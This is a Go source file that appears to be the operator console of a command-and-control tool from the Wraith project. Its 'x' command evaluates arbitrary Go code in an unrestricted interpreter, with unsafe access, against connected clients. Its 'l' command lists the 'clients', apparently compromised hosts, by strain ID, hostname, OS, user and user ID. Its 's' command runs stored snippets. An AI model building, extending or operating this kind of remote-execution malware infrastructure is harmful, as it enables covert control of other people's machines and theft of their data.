package main

import (
	"fmt"
	"strconv"
	"strings"

	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/cmd/pc3/lib"
	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/cmd/pc3/snippets"
	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/symbols"
	"github.com/traefik/yaegi/interp"
	"github.com/traefik/yaegi/stdlib"
	"github.com/traefik/yaegi/stdlib/unsafe"
)

func CmdX(ctx lib.CommandContext, arg string) (string, error) {
	i := interp.New(interp.Options{
		Unrestricted: true,
	})

	i.Use(symbols.Symbols)
	i.Use(stdlib.Symbols)
	i.Use(unsafe.Symbols)

	_, err := i.Eval(arg)
	if err != nil {
		return "", fmt.Errorf("could not evaluate due to error: %e", err)
	}

	result, err := i.Eval("main.X")
	if err != nil {
		return "", fmt.Errorf("could not find `main.X`: %e", err)
	}

	if !result.IsValid() {
		// The program didn't return anything for us to run, so assume everything
		// is done and notify the user.
		return "program did not return anything", nil
	}

	communicator, ok := result.Interface().(func(lib.CommandContext) (string, error))
	if !ok {
		return "", fmt.Errorf("returned function was of incorrect type (%T)", result.Interface())
	}

	return communicator(ctx)
}

func CmdL(ctx lib.CommandContext, arg string) (string, error) {
	var (
		page int
		err  error
	)
	if arg == "" {
		page = 0
	} else {
		page, err = strconv.Atoi(arg)
		if err != nil {
			return "", fmt.Errorf("could not parse argument: %e", err)
		}
	}

	clients, err := ctx.State.ClientGetPage(page*lib.DATA_PAGE_SIZE, lib.DATA_PAGE_SIZE)
	if err != nil {
		return "", fmt.Errorf("could not get page from database: %e", err)
	}
	clientsTotalCount, err := ctx.State.ClientCount()
	if err != nil {
		return "", fmt.Errorf("could not get client total count from database: %e", err)
	}
	clientListString := fmt.Sprintf(
		"Client list page %d of %d (%d total client/s; %d per page):\n",
		page,
		clientsTotalCount/lib.DATA_PAGE_SIZE,
		clientsTotalCount,
		lib.DATA_PAGE_SIZE,
	)
	clientListString += "\n| Client ID | Strain ID | Init Time | Hostname | Host OS | Host Arch | HostUser | Host User ID | Modules | Errors |"
	clientListString += "\n| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |"
	for _, client := range clients {
		clientListString += fmt.Sprintf(
			"\n| %s | %s | %s | %s | %s | %s | %s | %s | %s | %d |",
			client.ID,
			client.LastHeartbeat.StrainId,
			client.LastHeartbeat.InitTime,
			client.LastHeartbeat.Hostname,
			client.LastHeartbeat.HostOS,
			client.LastHeartbeat.HostArch,
			client.LastHeartbeat.HostUser,
			client.LastHeartbeat.HostUserId,
			client.LastHeartbeat.Modules,
			client.LastHeartbeat.Errors,
		)
	}
	return clientListString, nil
}

func CmdS(ctx lib.CommandContext, arg string) (string, error) {
	snippetName, snippetArg, _ := strings.Cut(arg, " ")
	if snippet, exists := snippets.Snippets[snippetName]; exists {
		return snippet(ctx, snippetArg)
	} else {
		return "", fmt.Errorf("no snippet found with name `%s`", snippetName)
	}
}

func CmdH(ctx lib.CommandContext, arg string) (string, error) {
	switch strings.ToLower(arg) {
	case "":
		return "", nil
	default:
		return "", fmt.Errorf("no help found for keyword `%s`", arg)
	}
}

func ExecCmd(ctx lib.CommandContext, command string) (response string, errResponse error) {
	defer func() {
		if p := recover(); p != nil {
			errResponse = fmt.Errorf("command panicked: %e", p)
		}
	}()

	keyword, arg, _ := strings.Cut(command, " ")
	switch strings.ToLower(keyword) {
	case "x":
		return CmdX(ctx, arg)
	case "l":
		return CmdL(ctx, arg)
	case "s":
		return CmdS(ctx, arg)
	case "h":
		return CmdH(ctx, arg)
	}

	return fmt.Sprintf("keyword `%s` not found, try `h` for help", keyword), nil
}
